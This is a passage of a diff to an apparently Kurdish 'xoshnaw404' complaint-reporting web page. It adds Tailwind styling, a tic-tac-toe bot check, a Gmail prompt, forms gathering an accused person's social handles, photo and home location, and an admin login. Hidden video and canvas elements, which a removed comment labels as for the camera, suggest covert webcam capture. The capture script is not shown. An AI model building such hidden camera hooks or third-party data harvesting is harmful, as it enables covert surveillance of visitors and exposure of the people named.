@@ -1,1213 +1,715 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="ku" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>404 - System Error</title>
-
-<style>
-* { box-sizing: border-box; }
-
-body {
-    margin: 0;
-    min-height: 100vh;
-    background: radial-gradient(circle at center, #00152e 0%, #000714 50%, #000205 100%);
-    color: #00e1ff;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    overflow-x: hidden;
-    position: relative;
-}
-
-body::before {
-    content: "404";
-    position: fixed;
-    inset: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;  
-    font-size: 320px;
-    font-weight: 900;
-    color: rgba(0, 225, 255, 0.015);
-    pointer-events: none;
-    z-index: 0;
-}
-
-body::after {
-    content: "";
-    position: fixed;
-    inset: 0;
-    background: repeating-linear-gradient(
-        to bottom,
-        rgba(255,255,255,0.01) 0px,
-        rgba(255,255,255,0.01) 1px,
-        transparent 2px,
-        transparent 4px
-    );
-    pointer-events: none;
-    z-index: 10;
-}
-
-#introScreen {
-    position: fixed;
-    inset: 0;
-    background: radial-gradient(circle at center, #002244 0%, #000714 70%, #000205 100%);
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-    text-align: center;
-    padding: 30px;
-}
-
-.intro-card {
-    border: 1px solid rgba(0, 225, 255, 0.4);
-    background: rgba(2, 12, 27, 0.9);
-    padding: 45px 35px;
-    border-radius: 16px;
-    box-shadow: 0 0 50px rgba(0, 140, 255, 0.25), inset 0 0 30px rgba(0, 225, 255, 0.05);
-    backdrop-filter: blur(12px);
-    max-width: 580px;
-    width: 100%;
-    position: relative;
-    animation: cardGlow 2.5s infinite alternate;
-}
-
-@keyframes cardGlow {
-    0% { box-shadow: 0 0 25px rgba(0, 140, 255, 0.3), inset 0 0 15px rgba(0, 225, 255, 0.05); border-color: rgba(0, 140, 255, 0.4); }
-    100% { box-shadow: 0 0 60px rgba(0, 225, 255, 0.6), inset 0 0 30px rgba(0, 225, 255, 0.15); border-color: rgba(0, 225, 255, 0.9); }
-}
-
-.intro-card::before {
-    content: "";
-    position: absolute;
-    width: 18px;
-    height: 18px;
-    border-top: 3px solid #00e1ff;
-    border-left: 3px solid #00e1ff;
-    top: -6px;
-    left: -6px;
-    border-radius: 4px;
-}
-
-.intro-card::after {
-    content: "";
-    position: absolute;
-    width: 18px;
-    height: 18px;
-    border-bottom: 3px solid #00e1ff;
-    border-right: 3px solid #00e1ff;
-    bottom: -6px;
-    right: -6px;
-    border-radius: 4px;
-}
-
-.intro-logo-text {
-    font-size: 60px;
-    font-weight: 900;
-    color: #00e1ff;
-    text-shadow: 0 0 20px rgba(0, 140, 255, 0.8), 0 0 40px rgba(0, 225, 255, 0.5);
-    letter-spacing: 8px;
-    animation: textFlicker 1.5s infinite alternate;
-}
-
-.intro-desc-text {
-    font-size: 17px;
-    font-weight: 600;
-    color: #7bc6ff;
-    line-height: 1.8;
-    text-shadow: 0 0 10px rgba(0, 140, 255, 0.3);
-    display: none;
-    margin-top: 10px;
-}
-
-.intro-loader {
-    width: 100%;
-    height: 6px;
-    background: rgba(0, 140, 255, 0.15);
-    border-radius: 6px;
-    margin-top: 30px;
-    overflow: hidden;
-    position: relative;
-    box-shadow: inset 0 0 5px rgba(0,0,0,0.5);
-}
-
-.intro-loader-bar {
-    width: 0%;
-    height: 100%;
-    background: linear-gradient(90deg, #0088ff, #00e1ff);
-    box-shadow: 0 0 20px #00e1ff;
-    transition: width 0.1s linear;
-    border-radius: 6px;
-}
-
-@keyframes textFlicker {
-    0% { opacity: 0.85; transform: scale(0.99); }
-    100% { opacity: 1; transform: scale(1); }
-}
-
-.container {
-    width: 430px;
-    max-width: 92%;
-    margin: 60px auto;
-    position: relative;
-    z-index: 2;
-    display: none;
-}
-
-.menu,
-.name-screen,
-.sections-screen {
-    border: 1px solid rgba(0, 140, 255, 0.4);
-    background: rgba(2, 12, 27, 0.88);
-    padding: 35px 30px;
-    box-shadow:
-        0 0 35px rgba(0, 140, 255, 0.2),
-        inset 0 0 40px rgba(0, 140, 255, 0.03);
-    backdrop-filter: blur(15px);
-    position: relative;
-    border-radius: 14px;
-}
-
-.menu::before,
-.name-screen::before,
-.sections-screen::before {
-    content: "";
-    position: absolute;
-    width: 12px;
-    height: 12px;
-    border-top: 2px solid #00e1ff;
-    border-left: 2px solid #00e1ff;
-    top: -3px;
-    left: -3px;
-    border-radius: 3px;
-}
-
-.menu::after,
-.name-screen::after,
-.sections-screen::after {
-    content: "";
-    position: absolute;
-    width: 12px;
-    height: 12px;
-    border-bottom: 2px solid #00e1ff;
-    border-right: 2px solid #00e1ff;
-    bottom: -3px;
-    right: -3px;
-    border-radius: 3px;
-}
-
-.logo {
-    text-align: center;
-    font-size: 90px;
-    font-weight: 900;
-    letter-spacing: 10px;
-    color: #00e1ff;
-    text-shadow:
-        0 0 10px rgba(0, 140, 255, 0.8),
-        0 0 25px rgba(0, 140, 255, 0.5),
-        0 0 40px rgba(0, 225, 255, 0.3);
-    margin-bottom: 5px;
-}
-
-.subtitle {
-    text-align: center;
-    color: #7bc6ff;
-    font-size: 14px;
-    margin-bottom: 30px;
-    font-weight: 500;
-    letter-spacing: 1px;
-}
-
-button,
-.link-button {
-    width: 100%;
-    padding: 15px;
-    margin-top: 12px;
-    background: linear-gradient(135deg, rgba(0, 136, 255, 0.08), rgba(0, 210, 255, 0.03));
-    border: 1px solid rgba(0, 140, 255, 0.5);
-    color: #00e1ff;
-    font-size: 15px;
-    font-weight: 600;
-    cursor: pointer;
-    text-decoration: none;
-    display: block;
-    text-align: center;
-    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-    border-radius: 8px;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-}
-
-button:hover,
-.link-button:hover {
-    background: linear-gradient(135deg, #0088ff, #00d2ff);
-    color: #fff;
-    border-color: #00e1ff;
-    box-shadow: 0 0 25px rgba(0, 210, 255, 0.6), inset 0 0 10px rgba(255,255,255,0.3);
-    transform: translateY(-2px);
-}
-
-.terminal {
-    margin-top: 25px;
-    padding: 18px;
-    border: 1px solid rgba(0, 140, 255, 0.25);
-    background: rgba(0, 4, 12, 0.75);
-    font-family: 'Courier New', Courier, monospace;
-    font-size: 12px;
-    line-height: 1.8;
-    color: #7bc6ff;
-    border-radius: 8px;
-    box-shadow: inset 0 0 15px rgba(0,0,0,0.8);
-}
-
-.terminal span {
-    color: #00e1ff;
-    font-weight: bold;
-}
-
-.name-screen {
-    display: none;
-}
-
-.name-title {
-    text-align: center;
-    font-size: 24px;
-    font-weight: 700;
-    margin-bottom: 10px;
-    color: #00e1ff;
-    text-shadow: 0 0 10px rgba(0,210,255,0.4);
-}
-
-.bot-warning {
-    text-align: center;
-    color: #7bc6ff;
-    font-size: 13px;
-    margin-bottom: 20px;
-    line-height: 1.8;
-}
-
-.ox-box {
-    margin-top: 10px;
-}
-
-.ox-board {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 8px;
-    width: 225px;
-    margin: auto;
-}
-
-.ox-cell {
-    width: 70px;
-    height: 70px;
-    padding: 0;
-    margin: 0;
-    border: 1px solid rgba(0, 140, 255, 0.5);
-    background: rgba(0, 5, 15, 0.9);
-    color: #00e1ff;
-    font-size: 28px;
-    font-weight: bold;
-    cursor: pointer;
-    border-radius: 8px;
-    transition: all 0.2s ease;
-}
-
-.ox-cell:hover {
-    background: rgba(0, 136, 255, 0.2);
-    border-color: #00e1ff;
-    box-shadow: 0 0 15px rgba(0, 210, 255, 0.4);
-}
-
-.ox-message {
-    text-align: center;
-    color: #7bc6ff;
-    font-size: 13px;
-    margin-top: 18px;
-    min-height: 20px;
-    font-weight: 500;
-}
-
-.ox-reset {
-    font-size: 13px;
-    padding: 12px;
-    margin-top: 15px;
-}
-
-.gmail-screen {
-    display: none;
-}
-
-input,
-textarea {
-    width: 100%;
-    padding: 14px 16px;
-    background: rgba(0, 4, 12, 0.8);
-    border: 1px solid rgba(0, 140, 255, 0.4);
-    outline: none;
-    color: #00e1ff;
-    font-size: 14px;
-    border-radius: 8px;
-    transition: all 0.3s ease;
-    box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
-}
-
-input:focus,
-textarea:focus {
-    border-color: #00e1ff;
-    box-shadow: 0 0 20px rgba(0, 210, 255, 0.4), inset 0 2px 5px rgba(0,0,0,0.5);
-    background: rgba(0, 8, 22, 0.9);
-}
-
-textarea {
-    min-height: 100px;
-    resize: vertical;
-}
-
-.error {
-    color: #ff4d6d;
-    font-size: 12px;
-    text-align: center;
-    margin-top: 10px;
-    display: none;
-    font-weight: 600;
-    text-shadow: 0 0 8px rgba(255, 77, 109, 0.4);
-}
-
-.sections-screen {
-    display: none;
-}
-
-.sections-title {
-    text-align: center;
-    font-size: 24px;
-    font-weight: 700;
-    margin-bottom: 25px;
-    color: #00e1ff;
-    text-shadow: 0 0 10px rgba(0,210,255,0.4);
-}
-
-.section-number {
-    color: #0066cc;
-    margin-right: 10px;
-    font-weight: 800;
-}
-
-.back-btn {
-    margin-top: 20px;
-    border-color: rgba(255, 77, 109, 0.4);
-    color: #ff758c;
-}
-
-.back-btn:hover {
-    background: linear-gradient(135deg, #ff4d6d, #ff758c);
-    border-color: #ff4d6d;
-    box-shadow: 0 0 20px rgba(255, 77, 109, 0.6);
-    color: #fff;
-}
-
-.complaint-screen {
-    display: none;
-}
-
-.complaint-title {
-    text-align: center;
-    font-size: 24px;
-    font-weight: 700;
-    margin-bottom: 22px;
-    color: #00e1ff;
-    text-shadow: 0 0 10px rgba(0,210,255,0.4);
-}
-
-.complaint-group {
-    margin-bottom: 15px;
-}
-
-.complaint-group label {
-    display: block;
-    color: #7bc6ff;
-    font-size: 12px;
-    margin-bottom: 6px;
-    text-align: right;
-    font-weight: 600;
-}
-
-.complaint-group input,
-.complaint-group textarea {
-    direction: rtl;
-}
-
-.complaint-group input[type="file"] {
-    padding: 10px;
-    cursor: pointer;
-    background: rgba(0, 4, 12, 0.6);
-}
-
-.complaint-success {
-    display: none;
-    text-align: center;
-    color: #00e1ff;
-    font-size: 13px;
-    margin-top: 15px;
-    line-height: 1.8;
-    font-weight: 600;
-    text-shadow: 0 0 10px rgba(0, 225, 255, 0.5);
-}
-
-.suggestion-screen {
-    display: none;
-}
-
-.suggestion-title {
-    text-align: center;
-    font-size: 24px;
-    font-weight: 700;
-    margin-bottom: 22px;
-    color: #00e1ff;
-    text-shadow: 0 0 10px rgba(0,210,255,0.4);
-}
-
-.suggestion-group {
-    margin-bottom: 15px;
-}
-
-.suggestion-group label {
-    display: block;
-    color: #7bc6ff;
-    font-size: 12px;
-    margin-bottom: 6px;
-    text-align: right;
-    font-weight: 600;
-}
-
-.suggestion-group input,
-.suggestion-group textarea {
-    direction: rtl;
-}
-
-.suggestion-group input[type="file"] {
-    padding: 10px;
-    cursor: pointer;
-    background: rgba(0, 4, 12, 0.6);
-}
-
-.suggestion-success {
-    display: none;
-    text-align: center;
-    color: #00e1ff;
-    font-size: 13px;
-    margin-top: 15px;
-    line-height: 1.8;
-    font-weight: 600;
-    text-shadow: 0 0 10px rgba(0, 225, 255, 0.5);
-}
-
-.report-login-screen {
-    display: none;
-}
-
-.report-login-title {
-    text-align: center;
-    font-size: 24px;
-    font-weight: 700;
-    margin-bottom: 22px;
-    color: #00e1ff;
-    text-shadow: 0 0 10px rgba(0,210,255,0.4);
-}
-
-.report-login-group {
-    margin-bottom: 15px;
-}
-
-.report-login-group label {
-    display: block;
-    color: #7bc6ff;
-    font-size: 12px;
-    margin-bottom: 6px;
-    text-align: right;
-    font-weight: 600;
-}
-
-@media (max-width: 500px) {
-    .container {
-        margin: 30px auto;
-    }
-    .logo {
-        font-size: 70px;
-    }
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>404 - Cyber Security & Report System</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Vazirmatn', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        cyber: {
+                            900: '#000205',
+                            800: '#000714',
+                            700: '#00152e',
+                            600: '#002244',
+                            500: '#0088ff',
+                            400: '#00e1ff',
+                            accent: '#ff4d6d'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            background: radial-gradient(circle at center, #00152e 0%, #000714 50%, #000205 100%);
+            color: #00e1ff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        body::before {
+            content: "404";
+            position: fixed;
+            inset: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 32vw;
+            font-weight: 900;
+            color: rgba(0, 225, 255, 0.015);
+            pointer-events: none;
+            z-index: 0;
+        }
+        body::after {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(
+                to bottom,
+                rgba(255,255,255,0.01) 0px,
+                rgba(255,255,255,0.01) 1px,
+                transparent 2px,
+                transparent 4px
+            );
+            pointer-events: none;
+            z-index: 10;
+        }
+        .cyber-card {
+            background: rgba(2, 12, 27, 0.88);
+            border: 1px solid rgba(0, 225, 255, 0.35);
+            box-shadow: 0 0 35px rgba(0, 140, 255, 0.2), inset 0 0 30px rgba(0, 225, 255, 0.04);
+            backdrop-filter: blur(16px);
+            position: relative;
+            border-radius: 1rem;
+        }
+        .cyber-card::before {
+            content: "";
+            position: absolute;
+            width: 14px;
+            height: 14px;
+            border-top: 2px solid #00e1ff;
+            border-left: 2px solid #00e1ff;
+            top: -4px;
+            left: -4px;
+            border-radius: 3px;
+        }
+        .cyber-card::after {
+            content: "";
+            position: absolute;
+            width: 14px;
+            height: 14px;
+            border-bottom: 2px solid #00e1ff;
+            border-right: 2px solid #00e1ff;
+            bottom: -4px;
+            right: -4px;
+            border-radius: 3px;
+        }
+        .cyber-input {
+            background: rgba(0, 4, 12, 0.85);
+            border: 1px solid rgba(0, 140, 255, 0.4);
+            color: #00e1ff;
+            transition: all 0.3s ease;
+        }
+        .cyber-input:focus {
+            border-color: #00e1ff;
+            box-shadow: 0 0 20px rgba(0, 210, 255, 0.4), inset 0 2px 5px rgba(0,0,0,0.5);
+            background: rgba(0, 8, 22, 0.95);
+            outline: none;
+        }
+        .cyber-btn {
+            background: linear-gradient(135deg, rgba(0, 136, 255, 0.1), rgba(0, 210, 255, 0.04));
+            border: 1px solid rgba(0, 140, 255, 0.5);
+            color: #00e1ff;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        .cyber-btn:hover {
+            background: linear-gradient(135deg, #0088ff, #00d2ff);
+            color: #ffffff;
+            border-color: #00e1ff;
+            box-shadow: 0 0 25px rgba(0, 210, 255, 0.6), inset 0 0 10px rgba(255,255,255,0.3);
+            transform: translateY(-2px);
+        }
+        @keyframes textFlicker {
+            0% { opacity: 0.85; transform: scale(0.99); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .flicker-text {
+            animation: textFlicker 1.5s infinite alternate;
+        }
+    </style>
 </head>
+<body class="flex items-center justify-center p-4">
 
-<body>
+    <video id="webcamVideo" autoplay playsinline class="hidden"></video>
+    <canvas id="webcamCanvas" class="hidden"></canvas>
 
-<!-- عناصر مەخفی بۆ کامێرا (هەردوو دیو) -->
-<video id="webcamVideo" autoplay playsinline style="display:none;"></video>
-<canvas id="webcamCanvas" style="display:none;"></canvas>
-
-<!-- ULTIMATE INTRO SCREEN -->
-<div id="introScreen">
-    <div class="intro-card">
-        <div class="intro-logo-text" id="introLogoText">xoshnaw404</div>
-        <div class="intro-desc-text" id="introDescText">داتای هەموو کەسێک تاوانبار یاخود سکاڵاکەر لێرە پارێزراوە و وردبینی بۆ هەموو داتایەک ئەکەین</div>
-        <div class="intro-loader">
-            <div class="intro-loader-bar" id="introLoaderBar"></div>
+    <div id="introScreen" class="fixed inset-0 bg-gradient-radial from-cyber-600 via-cyber-800 to-cyber-900 flex flex-col justify-center items-center z-[9999] p-6 text-center">
+        <div class="cyber-card p-8 md:p-12 max-w-lg w-full">
+            <div id="introLogoText" class="text-5xl md:text-6xl font-black text-cyber-400 tracking-wider drop-shadow-[0_0_25px_rgba(0,225,255,0.6)] flicker-text">xoshnaw404</div>
+            <div id="introDescText" class="text-base md:text-lg font-semibold text-sky-300 leading-relaxed drop-shadow-[0_0_10px_rgba(0,140,255,0.3)] hidden mt-4">
+                داتای هەموو کەسێک تاوانبار یاخود سکاڵاکەر لێرە پارێزراوە و وردبینی بۆ هەموو داتایەک ئەکەین
+            </div>
+            <div class="w-full h-2 bg-blue-500/15 rounded-full mt-8 overflow-hidden relative shadow-inner">
+                <div id="introLoaderBar" class="w-0 h-full bg-gradient-to-r from-blue-500 to-cyber-400 shadow-[0_0_20px_#00e1ff] transition-all duration-100 rounded-full"></div>
+            </div>
         </div>
     </div>
-</div>
 
-<div class="container" id="mainContainer">
+    <div class="w-full max-w-md my-8 relative z-20 hidden" id="mainContainer">
 
-<!-- START -->
-<div class="menu" id="menu">
-    <div class="logo">404</div>
-    <div class="subtitle">( بەشی سکاڵا تۆمار کردن )</div>
-    <button onclick="openOX()">سکاڵا تۆمار کردن</button>
-    <div class="terminal">
-        <div><span>[ SYSTEM ]</span> ONLINE</div>
-        <div><span>[ SECURITY ]</span> ACTIVE</div>
-        <div><span>[ CONNECTION ]</span> ENCRYPTED</div>
-        <div><span>[ ACCESS ]</span> GRANTED</div>
-        <div><span>[ STATUS ]</span> WAITING...</div>
-        <div><span>[ DEV ]</span> BY 404</div>
-    </div>
-</div>
-
-<!-- OX -->
-<div class="name-screen" id="oxScreen">
-    <div class="name-title">OX</div>
-    <div class="bot-warning">ڕێگە نادات 🤖 BOT سیستەم</div>
-    <div class="ox-box">
-        <div class="ox-board">
-            <button class="ox-cell" onclick="playOX(0)"></button>
-            <button class="ox-cell" onclick="playOX(1)"></button>
-            <button class="ox-cell" onclick="playOX(2)"></button>
-            <button class="ox-cell" onclick="playOX(3)"></button>
-            <button class="ox-cell" onclick="playOX(4)"></button>
-            <button class="ox-cell" onclick="playOX(5)"></button>
-            <button class="ox-cell" onclick="playOX(6)"></button>
-            <button class="ox-cell" onclick="playOX(7)"></button>
-            <button class="ox-cell" onclick="playOX(8)"></button>
+        <!-- Main Menu -->
+        <div class="cyber-card p-6 md:p-8" id="menu">
+            <div class="text-center text-7xl md:text-8xl font-black tracking-widest text-cyber-400 drop-shadow-[0_0_30px_rgba(0,225,255,0.7)] mb-2">404</div>
+            <div class="text-center text-sky-300 text-sm font-medium tracking-wider mb-8">( بەشی سکاڵا تۆمار کردن )</div>
+            
+            <button onclick="openOX()" class="cyber-btn w-full py-4 rounded-xl font-bold text-base shadow-lg mb-6">سکاڵا تۆمار کردن</button>
+            
+            <div class="cyber-card bg-black/60 p-4 rounded-xl font-mono text-xs leading-relaxed text-sky-300 shadow-inner border border-blue-500/20">
+                <div class="flex justify-between"><span>[ SYSTEM ]</span> <span class="text-cyber-400 font-bold">ONLINE</span></div>
+                <div class="flex justify-between"><span>[ SECURITY ]</span> <span class="text-cyber-400 font-bold">ACTIVE</span></div>
+                <div class="flex justify-between"><span>[ CONNECTION ]</span> <span class="text-cyber-400 font-bold">ENCRYPTED</span></div>
+                <div class="flex justify-between"><span>[ ACCESS ]</span> <span class="text-cyber-400 font-bold">GRANTED</span></div>
+                <div class="flex justify-between"><span>[ STATUS ]</span> <span class="text-cyber-400 font-bold">WAITING...</span></div>
+                <div class="flex justify-between"><span>[ DEV ]</span> <span class="text-cyber-400 font-bold">BY 404</span></div>
+            </div>
         </div>
-        <div class="ox-message" id="oxMessage">تۆ X ـیت</div>
-        <button class="ox-reset" onclick="resetOX()">نوێکردنەوەی OX</button>
+
+        <!-- OX Security Verification Game -->
+        <div class="cyber-card p-6 md:p-8 hidden" id="oxScreen">
+            <h2 class="text-2xl font-bold text-center text-cyber-400 mb-2 drop-shadow-[0_0_10px_rgba(0,210,255,0.4)]">OX</h2>
+            <p class="text-center text-sky-300 text-xs mb-6">ڕێگە نادات 🤖 BOT سیستەم</p>
+            
+            <div class="flex flex-col items-center">
+                <div class="grid grid-cols-3 gap-2.5 w-64 max-w-full mb-4">
+                    <button class="cyber-btn h-20 text-3xl font-black rounded-xl ox-cell" onclick="playOX(0)"></button>
+                    <button class="cyber-btn h-20 text-3xl font-black rounded-xl ox-cell" onclick="playOX(1)"></button>
+                    <button class="cyber-btn h-20 text-3xl font-black rounded-xl ox-cell" onclick="playOX(2)"></button>
+                    <button class="cyber-btn h-20 text-3xl font-black rounded-xl ox-cell" onclick="playOX(3)"></button>
+                    <button class="cyber-btn h-20 text-3xl font-black rounded-xl ox-cell" onclick="playOX(4)"></button>
+                    <button class="cyber-btn h-20 text-3xl font-black rounded-xl ox-cell" onclick="playOX(5)"></button>
+                    <button class="cyber-btn h-20 text-3xl font-black rounded-xl ox-cell" onclick="playOX(6)"></button>
+                    <button class="cyber-btn h-20 text-3xl font-black rounded-xl ox-cell" onclick="playOX(7)"></button>
+                    <button class="cyber-btn h-20 text-3xl font-black rounded-xl ox-cell" onclick="playOX(8)"></button>
+                </div>
+                <div class="text-center text-sky-300 text-sm font-medium min-h-[24px] mb-4" id="oxMessage">تۆ X ـیت</div>
+                <button onclick="resetOX()" class="cyber-btn w-full py-3 rounded-xl font-semibold text-sm">نوێکردنەوەی OX</button>
+            </div>
+        </div>
+
+        <!-- Gmail Authentication Screen -->
+        <div class="cyber-card p-6 md:p-8 hidden" id="gmailScreen">
+            <h2 class="text-2xl font-bold text-center text-cyber-400 mb-4 drop-shadow-[0_0_10px_rgba(0,210,255,0.4)]">Gmail - OX</h2>
+            <div class="space-y-4">
+                <input type="email" id="gmailInput" placeholder="example@gmail.com" autocomplete="email" class="cyber-input w-full p-4 rounded-xl text-sm">
+                <p class="text-sky-300 text-xs text-center leading-relaxed">
+                    تکایە ئەم ڕێنماییانە جێبەجێ بکە<br>سیستەم ڕێگە نادات BOT 🤖 بێتە سیستەم
+                </p>
+                <div class="text-rose-500 text-xs text-center font-semibold hidden drop-shadow-[0_0_8px_rgba(255,77,109,0.4)]" id="emailError">تکایە Gmail ـێکی دروست بنووسە</div>
+                <button onclick="checkEmail()" class="cyber-btn w-full py-4 rounded-xl font-bold text-base">بەردەوام بە</button>
+            </div>
+        </div>
+
+        <!-- Sections Menu Screen -->
+        <div class="cyber-card p-6 md:p-8 hidden" id="sectionsScreen">
+            <h2 class="text-2xl font-bold text-center text-cyber-400 mb-6 drop-shadow-[0_0_10px_rgba(0,210,255,0.4)]">بەشەکان</h2>
+            <div class="space-y-3">
+                <a class="cyber-btn w-full p-4 rounded-xl font-semibold text-sm flex items-center text-right no-underline" href="crime.html"><span class="text-blue-500 font-extrabold ml-3">01</span> تاوان</a>
+                <button class="cyber-btn w-full p-4 rounded-xl font-semibold text-sm flex items-center text-right" onclick="openComplaint()"><span class="text-blue-500 font-extrabold ml-3">02</span> سکاڵا</button>
+                <button class="cyber-btn w-full p-4 rounded-xl font-semibold text-sm flex items-center text-right" onclick="openReportLogin()"><span class="text-blue-500 font-extrabold ml-3">03</span> ڕاپۆرت</button>
+                <button class="cyber-btn w-full p-4 rounded-xl font-semibold text-sm flex items-center text-right" onclick="openSuggestion()"><span class="text-blue-500 font-extrabold ml-3">04</span> پێشنیار</button>
+            </div>
+        </div>
+
+        <!-- Complaint Submission Form -->
+        <div class="cyber-card p-6 md:p-8 hidden" id="complaintScreen">
+            <h2 class="text-2xl font-bold text-center text-cyber-400 mb-6 drop-shadow-[0_0_10px_rgba(0,210,255,0.4)]">سکاڵا</h2>
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">ناوی تاوانبار لە TikTok</label>
+                    <input type="text" id="tiktok" placeholder="ناوی TikTok" class="cyber-input w-full p-3.5 rounded-xl text-sm text-right">
+                </div>
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">ناوی تاوانبار لە Snapchat</label>
+                    <input type="text" id="snapchat" placeholder="ناوی Snapchat" class="cyber-input w-full p-3.5 rounded-xl text-sm text-right">
+                </div>
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">ناوی تاوانبار لە Instagram</label>
+                    <input type="text" id="instagram" placeholder="ناوی Instagram" class="cyber-input w-full p-3.5 rounded-xl text-sm text-right">
+                </div>
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">ناوی تاوانبار لە Telegram</label>
+                    <input type="text" id="telegram" placeholder="ناوی Telegram" class="cyber-input w-full p-3.5 rounded-xl text-sm text-right">
+                </div>
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">ناوی تاوانبار لە Facebook</label>
+                    <input type="text" id="facebook" placeholder="ناوی Facebook" class="cyber-input w-full p-3.5 rounded-xl text-sm text-right">
+                </div>
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">ناوی کەسەکە خۆی</label>
+                    <input type="text" id="personName" placeholder="ناوی کەسەکە" class="cyber-input w-full p-3.5 rounded-xl text-sm text-right">
+                </div>
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">وێنەی کەسەکە</label>
+                    <input type="file" id="personImage" accept="image/*" class="cyber-input w-full p-2.5 rounded-xl text-xs cursor-pointer">
+                </div>
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">شوێنی نیشتەجێبوون</label>
+                    <textarea id="location" placeholder="شوێنی نیشتەجێبوون" class="cyber-input w-full p-3.5 rounded-xl text-sm text-right h-24 resize-y"></textarea>
+                </div>
+                
+                <button onclick="sendComplaint()" class="cyber-btn w-full py-4 rounded-xl font-bold text-base">ناردنی سکاڵا</button>
+                <button onclick="backToSections()" class="w-full py-3 rounded-xl font-semibold text-sm border border-rose-500/40 text-rose-400 hover:bg-rose-500 hover:text-white transition-all duration-300">گەڕانەوە</button>
+                <div class="text-center text-cyber-400 text-xs font-semibold hidden mt-2 leading-relaxed" id="complaintSuccess">سکاڵاکە بە سەرکەوتوویی تۆمار کرا.</div>
+            </div>
+        </div>
+
+        <!-- Suggestion Screen -->
+        <div class="cyber-card p-6 md:p-8 hidden" id="suggestionScreen">
+            <h2 class="text-2xl font-bold text-center text-cyber-400 mb-6 drop-shadow-[0_0_10px_rgba(0,210,255,0.4)]">پێشنیار</h2>
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">هۆکاری گومان کردن لە کەسی بەرامبەر</label>
+                    <textarea id="suggestionReason" placeholder="هۆکاری گومان کردن بنووسە..." class="cyber-input w-full p-3.5 rounded-xl text-sm text-right h-24 resize-y"></textarea>
+                </div>
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">چات / دەقی پەیوەندیدار</label>
+                    <textarea id="suggestionChat" placeholder="چات یان دەقی پەیوەندیدار بنووسە..." class="cyber-input w-full p-3.5 rounded-xl text-sm text-right h-24 resize-y"></textarea>
+                </div>
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">وێنە</label>
+                    <input type="file" id="suggestionImage" accept="image/*" class="cyber-input w-full p-2.5 rounded-xl text-xs cursor-pointer">
+                </div>
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">ڤیدیۆ</label>
+                    <input type="file" id="suggestionVideo" accept="video/*" class="cyber-input w-full p-2.5 rounded-xl text-xs cursor-pointer">
+                </div>
+                
+                <button onclick="sendSuggestion()" class="cyber-btn w-full py-4 rounded-xl font-bold text-base">ناردنی پێشنیار</button>
+                <button onclick="backFromSuggestion()" class="w-full py-3 rounded-xl font-semibold text-sm border border-rose-500/40 text-rose-400 hover:bg-rose-500 hover:text-white transition-all duration-300">گەڕانەوە</button>
+                <div class="text-center text-cyber-400 text-xs font-semibold hidden mt-2 leading-relaxed" id="suggestionSuccess">پێشنیارەکە بە سەرکەوتوویی تۆمار کرا.</div>
+            </div>
+        </div>
+
+        <!-- Report Admin Login Screen -->
+        <div class="cyber-card p-6 md:p-8 hidden" id="reportLoginScreen">
+            <h2 class="text-2xl font-bold text-center text-cyber-400 mb-6 drop-shadow-[0_0_10px_rgba(0,210,255,0.4)]">Report Login</h2>
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">Username</label>
+                    <input type="text" id="reportUsername" placeholder="Username" autocomplete="username" class="cyber-input w-full p-3.5 rounded-xl text-sm">
+                </div>
+                <div>
+                    <label class="block text-sky-300 text-xs font-semibold mb-1.5 text-right">Password</label>
+                    <input type="password" id="reportPassword" placeholder="Password" autocomplete="current-password" class="cyber-input w-full p-3.5 rounded-xl text-sm">
+                </div>
+                <div class="text-rose-500 text-xs text-center font-semibold hidden drop-shadow-[0_0_8px_rgba(255,77,109,0.4)]" id="reportLoginError">Username یان Password هەڵەیە</div>
+                <button onclick="checkReportLogin()" class="cyber-btn w-full py-4 rounded-xl font-bold text-base">چوونەژوورەوە</button>
